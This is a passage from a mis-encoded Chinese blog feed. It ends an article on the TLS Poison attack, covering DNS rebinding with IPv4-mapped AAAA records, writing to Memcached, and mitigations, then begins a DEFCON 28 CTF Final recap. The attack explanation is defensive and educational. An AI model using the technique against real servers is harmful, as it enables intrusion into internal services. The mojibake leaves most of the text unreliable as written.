getaddrinfo ï¼‰ï¼Œå®ƒä»¬çš„è¡Œä¸ºä¸ä¸€è‡´ï¼Œå®šä¹‰ getaddrinfo çš„æ–‡æ¡£æ˜¯ RFC 3493ï¼Œè€Œ RFC 3493 æ²¡æœ‰å‚è€ƒ RFC 3484 ï¼Œå®ƒæ ¹æœ¬æ²¡æœ‰æåˆ°æ’åºã€‚è¯·æ³¨æ„ï¼ŒRFC3484 ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†ã€‚å®ƒæ˜¯ä¸€ä¸ª \u0026ldquo;proposed standard\u0026rdquo;\u0026ndash;æœ€æ—©çš„ IETF æ ‡å‡†è·Ÿè¸ªæ–‡ä»¶çŠ¶æ€çš„ä¸œè¥¿ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬åº”è¯¥å»ºè®® RFC3484 è§„åˆ™ 9 åº”è¢«åºŸå¼ƒï¼Œå¹¶åº”è¢«åºŸé™¤ï¼ˆIPv4 åº”è¯¥è¦åºŸé™¤è¿™ä¸ªè§„åˆ™ï¼ŒIPv6 å¯èƒ½ä¹Ÿéœ€è¦ï¼‰ã€‚\nAdditional Remarks IPv4-Mapped 127.0.0.1 2021/05/14 æ›´æ–°ï¼š\nå¯¹äº IPv4-mapped IPv6 è¿™ç±»åœ°å€ï¼Œæˆ‘è®¤ä¸ºå¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ v6 åœ°å€ï¼ŒçœŸæ­£ v6 çš„ loopback åœ°å€ä¸º ::1 ï¼ŒIPv4-mapped IPv6 åªæ˜¯ IPv4 åœ°å€å†™æˆ IPv6 å½¢å¼ã€‚é‚£ä¹ˆæ—¢ç„¶å¹¶ä¸æ˜¯çœŸæ­£çš„ IPv6 ï¼Œä½†æ˜¯å†™ä½œäº† IPv6 ï¼Œæˆ‘è§‰å¾—å¯¹äºgetaddrinfoæ¥è¯´ï¼Œä»–ç¡®å®æ˜¯ IPv6 çš„ç»“æ„ï¼Œä½†æ˜¯å¯¹äº IPv6 æ¥è¯´ï¼ŒçœŸæ­£çš„å›ç¯åœ°å€å¹¶ä¸æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥ä»–å¯èƒ½è¢«è§†ä¸ºæ™®é€šçš„ IPv6 åœ°å€å¤„ç†ã€‚\næˆ‘ä»¬å¯ä»¥ç®€å•éªŒè¯ä¸€ä¸‹è‡ªå·±çš„æƒ³æ³•ï¼šç›´æ¥åœ¨ä¸€ä¸ªåŸŸåä¸ŠåŒæ—¶è®¾ç½® AAAA è®°å½•ä¸º ::ffff:7f00:0001 ï¼ŒA è®°å½•ä¸ºéšæ„ä¸€ä¸ª IPv4 å…¬ç½‘åœ°å€ã€‚\nä½¿ç”¨ curl è¯·æ±‚æˆ‘ä»¬è®¾ç½®çš„åŸŸåï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nå¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸¤ä¸ªåœ°å€æ˜¯éšæœºè¿”å›çš„ã€‚\nå¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥é‡æ–° debug ä¸€é getaddrinfo å‡½æ•°ï¼ŒéªŒè¯ä¸€ä¸‹è‡ªå·±çš„æƒ³æ³•ã€‚äºæ˜¯ï¼Œé‡æ–° debug äº†ä¸€é libc å½“ä¸­çš„ rfc3484_sort å‡½æ•°ï¼Œå¯¹äº ::ffff:7f00:0001 åœ°å€æ¥è¯´ï¼Œ getaddrinfo ä½¿ç”¨äº† IPv6 ç»“æ„ä½“å¤„ç†è¿™ä¸ªåœ°å€ï¼Œä½†æ˜¯æœ€åç»“æœæ˜¯æŒ‰ç…§ DNS å¾—åˆ°çš„åŸé¡ºåºè¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªåœ°å€ä¸ IPv4 vps åœ°å€ä¸€èµ·å‡ºç°æ—¶ï¼Œå¯¹äºgetaddrinfo æ¥è¯´æ˜¯éšæœºè¿”å›ã€‚æ‰€ä»¥ä»ç»“æœæ¥çœ‹ï¼Œä»–ç¡®å®è¢«è§†ä¸ºäº†è·Ÿ v4 vps ç›¸åŒä¼˜å…ˆçº§çš„åœ°å€ã€‚\nä½†æ˜¯æˆ‘ä»¬å®é™…ä¸Šåº”ä¸åº”è¯¥è¿™ä¹ˆå¤„ç†å‘¢ï¼ŸæŒ‰ç…§ RFC 6742 çš„è¯´æ³•ï¼š\n â€‹\tIPv4-compatible addresses [RFC4291], IPv4-mapped [RFC4291], IPv4-converted [RFC6145], IPv4-translatable [RFC6145], and 6to4 addresses [RFC3056] contain an embedded IPv4 address. For the purposes of this document, these addresses MUST be treated as having global scope.\n IPv4-mapped è¿™ç±»åœ°å€åº”è¯¥è¢«è§†ä¸ºæ‹¥æœ‰ global scope ï¼Œè€ŒçœŸæ­£æ„ä¹‰ä¸Šçš„å›ç¯åœ°å€åº”è¯¥æ˜¯è¢«ä½œä¸º link-local scope å¤„ç†çš„ï¼Œè¿™ä¹Ÿå°±åŸºæœ¬èƒ½è§£é‡Šä¸ºä»€ä¹ˆä»–ä¼šè¢«ä½œä¸ºä¸ v4 vps è¿™ç±»åœ°å€ä¸€æ ·çš„ä¼˜å…ˆçº§äº†ã€‚\næ‰€ä»¥ä¹‹å‰æ–‡ä¸­çš„è¯´æ³•ä¸åº”è¯¥æŠŠ ::ffff:7f00:0001 ä¸ 127.0.0.1 è§†ä¸ºåŒç±»åœ°å€ï¼Œè¿™ä¸€ç‚¹æ˜¯é”™è¯¯çš„ã€‚\nIPv4-Mapped With Memcached 2021/05/14 æ›´æ–°ï¼š\næˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ä½¿ç”¨ IPv4-Mapped è¿™ç±»åœ°å€è¿›è¡Œå®éªŒçœ‹çœ‹èƒ½ä¸èƒ½å†™å…¥ Memcachedï¼ŒåŒæ ·çš„ DNS é…ç½®ï¼šåœ¨ä¸€ä¸ªåŸŸåä¸ŠåŒæ—¶è®¾ç½® AAAA è®°å½•ä¸º ::ffff:7f00:0001 ï¼ŒA è®°å½•ä¸ºéšæ„ä¸€ä¸ª IPv4 å…¬ç½‘åœ°å€ã€‚\nç„¶åå…¶ä»–æ“ä½œåŸºæœ¬åŒåŒ A è®°å½•å®éªŒæ–¹å¼ä¸€è‡´ï¼Œä½¿ç”¨ proxy.py æ‹’ç»å®¢æˆ·ç«¯å¯¹ TLS æœåŠ¡ç«¯çš„ç¬¬äºŒæ¬¡è¯·æ±‚ä»¥è¾¾åˆ° DNS Rebinding çš„æ•ˆæœï¼Œäºæ˜¯å¾—åˆ°çš„å®éªŒç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nè¯´æ˜ Memcached å¯ä»¥ä» IPv4-Mapped è¿™ç±»åœ°å€å†™å…¥ã€‚\nMitigation çºµè§‚æ•´ä¸ªæ¼æ´ï¼Œæˆ‘è§‰å¾—å…¶å®é€ æˆè¿™ä¸ªæ¼æ´æ˜¯ç”±äºæ¯”è¾ƒå¤šå¤æ‚çš„å› ç´ å¯¼è‡´çš„ï¼Œä»åè®®è§’åº¦æ¥è¯´ï¼Œåœ¨ RFC å½“ä¸­ä¹Ÿå¹¶æ²¡æœ‰æåˆ° Client åˆ°åº•åº”è¯¥æ€ä¹ˆå­˜å‚¨ Server ç»™äºˆçš„ç›¸å…³å‡­è¯ï¼Œä¹Ÿå¹¶æ²¡æœ‰è¯´æ˜æ¸…æ¥šæ€ä¹ˆä¸å¯¹åº”çš„ TLS ä¼šè¯ç»‘å®šï¼Œæ‰€ä»¥å¯¼è‡´äº† Client åœ¨æ”¯æŒ TLS ä¼šè¯é‡ç”¨çš„äº§ç”Ÿäº†å„ç§å®ç°ï¼›è€Œä» Client å®¢æˆ·ç«¯æ¼æ´æ¥è¯´ï¼Œä¹Ÿæ˜¯å¼€å‘è€…ä»¬æ²¡æœ‰å¯¹è¿›è¡Œ TLS ä¼šè¯é‡ç”¨çš„åœ°å€è¿›è¡ŒäºŒæ¬¡æ ¡éªŒï¼Œå¯¼è‡´äº†å¯ä»¥ä½¿ç”¨ DNS Rebinding æ¥è½»æ¾ç»•è¿‡ã€‚\næ‰€ä»¥ï¼Œå¯¹äºè¯¥ç±»æ¼æ´é¦–è¦çš„é˜²æŠ¤æ‰‹æ®µå°±æ˜¯éœ€è¦ç¡®è®¤è¿›è¡Œ TLS ä¼šè¯é‡ç”¨çš„åœ°å€ä¸ä¹‹å‰çš„åœ°å€ä¸€è‡´ï¼Œè€Œè¿™ä¸ªå®ç°é€”å¾„æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œæ¯”å¦‚è¯´é˜²å¾¡ DNS Rebinding çš„æ–¹å¼èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£åˆ°æ•´ä¸ªæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å¯¹äº DNS Rebinding çš„ä¼ ç»Ÿé˜²å®ˆæ–¹å¼æœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šè¯´ Client åªåšä¸€æ¬¡ DNS è§£æï¼Œä¹‹åå°±ä¸€ç›´ä½¿ç”¨è¿™ä¸ª IP è§£æç»“æœï¼Œä½†æ˜¯å¦‚æœ Client å­˜åœ¨åƒæ–‡ä¸­é‚£æ ·çš„æŒ¨ä¸ªå°è¯•å»ºç«‹è¿æ¥åä½¿ç”¨ç¬¬ä¸€ä¸ªè¿æ¥æˆåŠŸçš„ IP çš„ç°è±¡çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸Šæ–‡æåˆ°çš„åŒ A è®°å½•çš„æ–¹å¼æ¥ç»•è¿‡è¯¥ç±»é™åˆ¶ã€‚\né‚£æ€ä¹ˆåšæ‰æ˜¯æœ€å¥½å‘¢ï¼Ÿä½œè€…åœ¨é˜²å¾¡ç« èŠ‚åšå‡ºäº†è‡ªå·±é˜è¿°ï¼š\n \nä½œè€…å»ºè®®å°† (hostname, port, ip_addr) ä½œä¸ºç¼“å­˜é”®å€¼å¯¹è¿›è¡Œç»‘å®šï¼Œä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼“è§£æªæ–½ï¼Œå› ä¸ºåœ¨å½“ä»Š CDN å¤§æµè¡Œçš„æƒ…å†µä¸‹ï¼Œå¾ˆéš¾è¯´è¿™ä¸ªåŸŸåä¼šä¸€ç›´ä½¿ç”¨åˆ°åŒä¸€ä¸ª IP ï¼Œå¦‚æœå°†åŸŸåã€ç«¯å£ã€IP ä¸‰è€…ç»‘å®šçš„è¯ï¼Œå¯¹äº CDN ä¹‹ç±»çš„æœåŠ¡ä¼šè¯é‡ç”¨æœºåˆ¶æ¶ˆè€—å°†ä¼šå¤§å¤§æå‡ã€‚\næ‰€ä»¥æˆ‘è§‰å¾—æ›´å¥½çš„åšæ³•åº”è¯¥æ˜¯æ­£å¦‚ Wiki ä¸Šä»‹ç»çš„ï¼Œä½¿ç”¨ IP ä¸å¯¹åº”çš„ç«¯å£è¿›è¡Œç»‘å®š ï¼š\n â€‹\tThe client associates this session id with the server\u0026rsquo;s IP address and TCP port, so that when the client connects again to that server, it can use the session id to shortcut the handshake.\n ä½¿ç”¨ IP ä¸å¯¹åº”çš„ç«¯å£ä½œä¸ºç¼“å­˜é”®å€¼å¯¹è¿›è¡Œç»‘å®šï¼Œè¿™æ ·çš„è¯å°±ä¸ä¼šå¯¹ CND ä¹‹ç±»çš„æœåŠ¡é€ æˆå¤ªå¤§å½±å“ï¼Œè€Œä¸”ä¹Ÿé™ä½äº†è¢«æ”»å‡»çš„é£é™©ï¼Œå°±ä¸ä¼šå°†é‡ç”¨ä¼šè¯å‘é€åˆ°å…¶ä»– IP ä¸Šäº†ã€‚å½“ç„¶è¿™é‡Œä¹Ÿåªæ˜¯æˆ‘ä¸ªäººç‰‡é¢çš„æƒ³æ³•ï¼Œå¯èƒ½è¿˜æœ‰å¾ˆå¤šè¿™ä¹ˆåšä¼šå—åˆ°å½±å“çš„åœ°æ–¹ï¼Œæ¯”å¦‚è¯´å¯èƒ½ Server å¯¹äº Host åŸŸåæœ‰æ ¡éªŒè€Œæ‹’ç»é‡ç”¨ä¼šè¯ç­‰ç­‰ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œå¯èƒ½å¹¶æ²¡æœ‰ä¸€ä¸ªåå…¨åç¾çš„ç¼“è§£è¯¥æ”»å‡»æ–¹å¼çš„é—®é¢˜ç­‰ç­‰ã€‚\nå½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥ç¦ç”¨æ‰ TLS ä¼šè¯é‡ç”¨çš„åŠŸèƒ½ï¼Œæœ‰äº› Client ä¸Šå°±æä¾›äº† Disable outbound TLS session resumption çš„è®¾ç½®ï¼ˆé™¤äº† chrome ç­‰å…¶ä»–ä¸€äº›ï¼‰ ï¼š\n libcurl: CURLOPT_SSL_SESSIONID_CACHE=false firefox: security.ssl.disable_session_identifiers=true Tor browser: disabled by default Java, Nodejs, Chrome, others: no option  Conclusion æ•´ä¸ªæ¼æ´å¼„ä¸‹æ¥è¿˜æ˜¯éå¸¸æœ‰æ„æ€çš„ï¼Œå°½ç®¡å…¶åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥è¢«æ”»å‡»çš„æœåŠ¡ + Client éœ€è¦æ”¯æŒ TLS Session Resumption + DNS Rebindingï¼ˆä¸‡ä¸€åªæŸ¥è¯¢ä¸€æ¬¡ DNS å°±æ²¡äº†ï¼‰ï¼Œåœ¨å½“ä»Šå…¨æ˜¯ä»æ•°å­¦ç®—æ³•è§’åº¦å» Hack TLS çš„æƒ…å†µä¸‹ï¼Œä½œè€…èƒ½ä»ä¸€ä¸ªæ¯”è¾ƒ Web çš„è§’åº¦æ¥ Hack TLS ï¼Œæˆ‘è§‰å¾—æ˜¯ä¸€ä¸ªéå¸¸ç‹¬åˆ°çš„è§†è§’ï¼Œæ˜¯éå¸¸å€¼å¾—å­¦ä¹ çš„åœ°æ–¹ï¼Œå°¤å…¶æ˜¯è¿™ç§åè®®è®¾è®¡çš„é—®é¢˜ä¸Šã€‚\nè¿˜æœ‰ï¼Œæˆ‘è§‰å¾—ä½œè€…çš„æ ‡é¢˜ä¹Ÿå–çš„å¾ˆæ£’ï¼Œã€ŠWhen TLS Hacks Youã€‹ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³ä¸€ä¸‹ä¸ºä»€ä¹ˆä¸æ˜¯ã€ŠWhen HTTPS Hacks Youã€‹å‘¢ï¼Ÿå–ä¸ªå…³å­ï¼Œå¦‚æœè¿˜æœ‰åç»­çš„è¿›å±•ï¼Œæˆ‘ä¹Ÿä¼šåŒæ­¥åˆ°è‡ªå·±çš„ä¸ªäººåšå®¢ä¸Šï¼Œæ¬¢è¿å…³æ³¨ï¼Œä»¥åŠå‰æ¥äº¤æµï¼šhttps://blog.zeddyu.info/\nä»¥ä¸Šå°±æ˜¯æœ¬ç¯‡æ–‡ç« çš„å…¨éƒ¨å†…å®¹äº†ï¼Œå¦‚æœå¯¹è¯¥ç¯‡æ–‡ç« æœ‰ä»»ä½•ç–‘é—®æˆ–è€…è´¨ç–‘ï¼Œæ¬¢è¿æ¥ä¿¡ï¼šecho emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d\næ¬¢è¿å¤§å®¶æŒ‡å‡ºæ–‡ç« çš„é”™è¯¯ï¼Œä¹Ÿæ¬¢è¿å¯¹åè®®å®‰å…¨ç­‰å†…å®¹æ„Ÿå…´è¶£çš„åŒå­¦ä¸€èµ·äº¤æµå­¦ä¹ ï¼\nAcknowledgements éå¸¸æ„Ÿè°¢åœ¨æ•´ä¸ªæµç¨‹ä¸­å¸®åŠ©æˆ‘çš„åŒå­¦ã€æœ‹å‹ä»¬ï¼Œç‰¹åˆ«æ„Ÿè°¢ @George åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å¯¹äºæˆ‘è¿™ä¸ªèŒæ–°ä¸è€æˆ‘çƒ¦çš„å¸®åŠ©ï¼Œæ„Ÿè°¢ @Joshua Maddux @zhaojin ç­‰äººåœ¨æ­¤å‰å¯¹è¯¥ç±»å‹æ”»å‡»åšå‡ºçš„è´¡çŒ®ï¼Œæ„Ÿè°¢ @rebirth @chuye å¯¹æœ¬æ–‡çš„ Review æŒ‡å‡ºäº†æœ¬æ–‡ä¹‹å‰ä¸å°‘çš„é”™è¯¯ã€‚\nå¦å¤–æ„Ÿè°¢ä¸€ä¸‹å°ç¼–è´Ÿè´£ä¸”è€å¿ƒçš„ç¼–è¾‘ï¼Œç¼–è¾‘è¿™ä¹ˆé•¿çš„æ–‡ç« çœŸæ˜¯è¾›è‹¦å°ç¼–äº†ã€‚\nReferences When TLS Hacks You\nDEF CON Safe Mode - Joshua Maddux - When TLS Hacks You\nTLS Poison\nrustls\nRFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2\nRFC 5077: Transport Layer Security (TLS) Session Resumption without Server-Side State\nRFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3\nRFC 3484: Default Address Selection for Internet Protocol version 6 (IPv6)\nRFC 6724: Default Address Selection for Internet Protocol Version 6 (IPv6)\nTransport Layer Security\nTLS Stateful vs Stateless Session Resumption\nTLS Session Resumption\nDefault destination address selection\nWhen TLS hacks you: TLS + SSRF = RCE by ducnt\nhxp 2020\nåŸºäº A å’Œ AAAA è®°å½•çš„ä¸€ç§æ–° DNS Rebinding å§¿åŠ¿â€“ä»è¥¿æ¹–è®ºå‰‘2020 Web HelloDiscuzQ é¢˜å¯¹ Blackhat ä¸Šçš„è®®é¢˜åšå‡å\n","date":"2021-04-20T18:34:26Z","permalink":"https://blog.zeddyu.info/2021/04/20/tls-poison/","title":"ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»"},{"content":"è·ç¦» DEFCON 28 Final å·²ç»è¿‡å»äº†ä¸¤ä¸ªå¤šæœˆäº†ï¼Œæœ¬æ¥ç»“æŸå°±å†™å†™ï¼Œä½†æ˜¯å› ä¸ºä¸€äº›åæ¥äº‹è€½æäº†ï¼Œç°åœ¨è¡¥ä¸€ä¸‹è¿™æ¬¡å‚èµ›çš„ä¸€äº›ç»å†ã€‚\n[TOC]\nPreface å‰è¨€ï¼šæœ¬ç¯‡æ–‡ç« ä¸ä»£è¡¨ä»»ä½•ç»„ç»‡ç¤¾å›¢çš„è§‚ç‚¹ï¼Œå…¨æ–‡ä»…ä»£è¡¨ä¸ªäººçœ‹æ³•ä»¥åŠæ„è§ã€‚å¦‚æœ‰å†’çŠ¯è¯·è”ç³»æˆ‘è¿›è¡Œå¿…è¦çš„ä¿®æ”¹ã€‚\nç”±äºä»Šå¹´ç–«æƒ…çš„åŸå› ï¼Œä»Šå¹´çš„ DEFCON Final åœ¨çº¿ä¸Šä¸¾åŠï¼Œæˆ‘æœ‰å¹¸ä¸ Tea Deliverers ä¸€èµ·å‚ä¸äº† DEFCON 28 CTF Final ï¼Œæœ€ç»ˆåœ¨æ¯”èµ›ä¸­å–å¾—äº†ç¬¬å››çš„æˆç»©ã€‚æœ¬æ–‡æˆ‘ä¼šä¸»è¦ä»å‚èµ›ç»å†è§é—»ä»¥åŠä¸€äº›å¯¹äº Web é¢˜çš„åˆ†æå…¥æ‰‹æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œç”±äº Web é¢˜è¿‡åˆ†ç®€å•ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«å¥½åˆ†æçš„ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆæŠ€æœ¯è¥å…»ï¼Œå¯ä»¥æƒå½“å°è¯´çœ‹çœ‹ï¼Œåšå›ä¸€ç¬‘ã€‚å¹¶ä¸”ä¸ºäº†é¿å…ä¸€äº›ä¸å¿…è¦çš„éº»çƒ¦ï¼Œå…¨æ–‡æ¶‰åŠåˆ°å§“å ID å¤„æˆ‘éƒ½å°½é‡ä»¥æŸå¸ˆå‚…è¿›è¡Œç§°å‘¼ã€‚\nThe First DEFCON Final In My Life Simple Introduction ä»Šå¹´çš„èµ›åˆ¶æˆ‘è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œæƒ³è¯¦ç»†äº†è§£çš„å¯ä»¥å‚è€ƒä¸€ä¸‹å®˜ç½‘:https://oooverflow.io/dc-ctf-2020-finals/\né¢˜ç›®ä¸»è¦åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œä¸€ç§ç±»å‹æ˜¯ AWD ï¼Œå¦ä¸€ç§æ˜¯ KOH ï¼ŒAWD å°±æ¯”è¾ƒå¸¸è§äº†ï¼Œå°±æ˜¯æ”»é˜²é¢˜ç›®ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦ KOH è¿™ç§é¢˜ç›®ç±»å‹ï¼Œè¿™ç§é¢˜ç›®ç±»å‹å¾€å¾€æ˜¯é¢˜ç›®ä¸­æœ‰è‡ªå·±çš„ä¸€ä¸ªç§¯åˆ†è§„åˆ™ï¼Œç„¶åè®©å„ä¸ªé˜Ÿä¼åœ¨æ¯ä¸ª ROUND å°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„åˆ†æ•°ï¼Œæ¯ä¸ª ROUND å–å‰ N åï¼Œæ¯ä¸ª ROUND ç»“æŸç»Ÿè®¡åˆ†æ•°å¹¶ç»™å‰ N åçš„é˜Ÿä¼åœ¨æ€»æ¦œçš„ KOH åˆ—åŠ åˆ†ã€‚åœ¨ KOH ä¸­å¦‚ä½•æ‹¿æ›´å¤šçš„åˆ†æ•°å°±æ˜¯è¿™ä¸ªé¢˜ç›®çš„å‡ºé¢˜ç‚¹äº†ï¼Œè¿™äº›å‡ºé¢˜ç‚¹å¯ä»¥æœ‰ä¸€äº›è®¾ç½®çš„æ¼æ´æˆ–è€…ä»€ä¹ˆå…¶ä»–çš„æ–¹å¼è®©ä½ å¯ä»¥åœ¨ä¸€ä¸ª ROUND å˜é¢å¾—æ›´å¤šçš„åˆ†æ•°ï¼Œç®€å•æ¥è¯´ï¼Œä½ å¯ä»¥ç†è§£ KOH ç»™äº†ä½ ä¸€ä¸ªæ¸¸æˆï¼Œæ¯ä¸ªé˜Ÿä¼æ¯5åˆ†é’Ÿç©ä¸€æŠŠæ¸¸æˆï¼Œä½ å¯ä»¥é€šè¿‡å¯¹æ¸¸æˆåˆ†ææ¥æ‰¾åˆ°ä¸€äº› bug æˆ–è€…ä»€ä¹ˆå…¶ä»–çš„ç‚¹ï¼Œé€šè¿‡è¿™ä¸ªç‚¹æ¥å¸®åŠ©ä½ åƒâ€œå¼€æŒ‚â€ä¸€æ ·å¾—åˆ†ã€‚\nTime  â€‹\tWeâ€™ll start 5 AM Las Vegas time on Friday, August 7th (4 AM for setup).\nHere is the schedule (Nevada time == PDT):\n Shift 1: Friday 4am setup, 5am start, 1pm end First public recap: Friday 2 PM Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end Second public recap: Saturday 1 PM Shift 3: Saturday 2pm setup, 3pm start, 11pm end Shift 4: Sunday 7am setup, 8am start, 4pm end Third public recap: Sunday at noon (during the game)   è¿™è½®çš„æ—¶é—´å¯è°“æ˜¯ç›¸å½“çš„æ‰€è°“çš„â€œå¥åº·â€äº†ï¼Œä¸Šè¿°æ—¶é—´è¡¨ç¿»è¯‘åˆ°åŒ—äº¬æ—¶é—´è¿‡æ¥å°±æ˜¯ï¼š\n  Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end Shift 2: Saturday 12am setup, 1pm start, 9pm end Shift 3: Sunday 5am setup, 6am start, 2pm end Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end   ä¹Ÿå°±æ˜¯è¯´æ¯ä¸ª Shift æ¯”èµ›è¿›è¡Œ8å°æ—¶ï¼Œæ¯ä¸ª Shift ä¸­é—´é—´éš”8å°æ—¶ï¼Œè€Œä¸”æ˜¯æ­£æ­£å¥½å¥½çš„8å°æ—¶ =.= è¿™å°±æ˜¯æ‰€è°“çš„â€œå¥åº·â€èµ›åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»æ¯”èµ›åœºåœ°å›å®¶ä¼‘æ¯å†æä¼šæ€ä¹ˆéƒ½æ²¡å‰©å¤šå°‘æ—¶é—´äº†ï¼Œæˆ‘è§‰å¾—è¿˜ä¸å¦‚ç¡¬è‚å¥½äº†ï¼ˆåæ­£æˆ‘è§‰å¾—æ²¡å‡ ä¸ªé˜Ÿåƒæˆ‘è¿™ä¸ªæ··å­ä¸€æ ·8å°æ—¶å…¨ç¡ï¼‰ï¼Œè€Œä¸”è¿˜åˆ†äº†4è½®ï¼Œè¿™æ˜¯çœŸçš„è‚ï¼Œäºæ˜¯é‚£å‡ å¤©æˆ‘çš„ä¸–ç•Œå°±å˜æˆäº†ä¸€å¤©16å°æ—¶çš„ä¸–ç•Œï¼Œ8å°æ—¶çœ‹é¢˜å½“æ··å­ï¼Œ8å°æ—¶ç¡è§‰ã€‚ï¼ˆ\nStealth Ports åœ¨ AWD èµ›åˆ¶ä¸­ï¼Œ OOO åŠ å…¥äº† Stealth Ports è¿™ç§æœºåˆ¶ï¼š\n â€‹\tNew this year, each service will have a STEALTH port alongside itâ€™s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ainâ€™t cheap! If your team sends any traffic through a serviceâ€™s stealth port to a given team, you will only receive half points for stealing that teamâ€™s flag that round.\n ä¹Ÿå°±æ˜¯è¯´ä¸»åŠæ–¹ç»™å¤§å®¶å¼€æ”¾äº†ä¸€ä¸ªä¸ç»™æµé‡çš„ç«¯å£ï¼Œå¦‚æœæœ‰æ”»å‡»æ–¹æˆåŠŸé€šè¿‡è¿™ä¸ªç«¯å£è·å–åˆ°é˜²å®ˆæ–¹çš„ Flag ï¼Œåˆ™ Flag åˆ†ä¼šå‡åŠã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ç›¸å½“äºä¸€ä¸ªéšå½¢çš„ç«¯å£ï¼Œå¯¹äºä¸€è¡€çš„é˜Ÿä¼æ¯”è¾ƒæœ‰åˆ©ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªç«¯å£è¿…é€Ÿæ‰“å…¨åœºè€Œä¸è¢«æ•è·åˆ°æµé‡ï¼Œä½†æ˜¯å¾—åˆ†ä¼šå‡åŠï¼Œä¹Ÿç®—æ˜¯ä¸€ç§åŒåˆƒå‰‘ã€‚\nBefore Shift 1 å¼€å§‹ä¹‹å‰æˆ‘ä¹Ÿå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å‡†å¤‡ï¼Œç»è¿‡ä¸€ç•ªè®¨è®ºå†³å®šæˆ‘ä»¬è¿˜æ˜¯åœ¨æŸå¸ˆå‚…çš„å…¬å¸é‡Œæ‰“æ¯”èµ›ï¼Œè¿™äº›è®¨è®ºåŒ…æ‹¬ä½†ä¸é™äºæ¯”èµ›åœºåœ°è¦ä¸è¦é€‰ä¸€ä¸ªåˆ«å¢…å•¥çš„ï¼Œä½†æ˜¯è€ƒè™‘åˆ°ç½‘ç»œé—®é¢˜è¿˜æ˜¯å†³å®šäº†åœ¨å…¬å¸é‡Œï¼Œä»¥åŠå¤§å®¶è¦ä¸è¦ä¸€èµ·å…ˆåƒä¸ªé¥­åšä¸ªèµ›å‰åŠ¨å‘˜ä»€ä¹ˆçš„ã€‚æ‰€ä»¥å°±åœ¨å¼€èµ›å‰2å°æ—¶å¤šï¼Œä¹Ÿå°±æ˜¯ä¸‹åˆ5ç‚¹å¤šï¼Œæˆ‘éšæˆ‘ Mentor å°±ä¸€èµ·å»è·Ÿé˜Ÿå‘˜ä»¬åƒäº†ä¸ªé¥­ï¼Œä¹Ÿç®—æ˜¯è·Ÿå¤§å®¶è®¤è¯†è®¤è¯†ï¼Œç„¶åå°±è¢«æ’åœ¨äº† Leader æ—è¾¹åï¼ˆç´§å¼ æ­»äº†ï¼Œæœ‰ç§é¢†å¯¼å¤¹èœæˆ‘è½¬æ¡Œçš„å†²åŠ¨ï¼‰ï¼Œç„¶å Leader æ—è¾¹åˆæ˜¯é‚£ä¸ªç»Ÿæ²»å¼ºç½‘æ¯çš„â€œé‚£ä¸ªç”·äººâ€ï¼ˆåˆç´§å¼ æ­»äº†ï¼Œç¬¬ä¸€æ¬¡è·Ÿè¿™ç§å¯æ€•çš„å·¨å‹å¤§ä½¬ç”Ÿç‰©è¿›è¡Œäº¤æµï¼‰ï¼Œæ•´ä¸ªä¼šé¤å°±è¿™æ ·åœ¨å¯¹äºæˆ‘æ¥è¯´åœ¨ä¸€ç§ä¸å¯åçŠ¶çš„æ°›å›´ä¸‹ç»“æŸäº†ã€‚XDï¼ˆæ„Ÿè§‰å…¶ä»–äººçœŸçš„æ˜¯åˆå¼ºåˆå£®ï¼Œå°±æˆ‘ä¸€ä¸ªå¯æ€œå¼±å°çš„å°èœé¸¡\nShift 1 ç”±äºä¹‹å‰æ¥å…¥ç­‰ç­‰å‡†å¤‡å·¥ä½œå¸ˆå‚…ä»¬éƒ½åšå®Œäº†ï¼Œæˆ‘ä¾¿åœ¨ setup 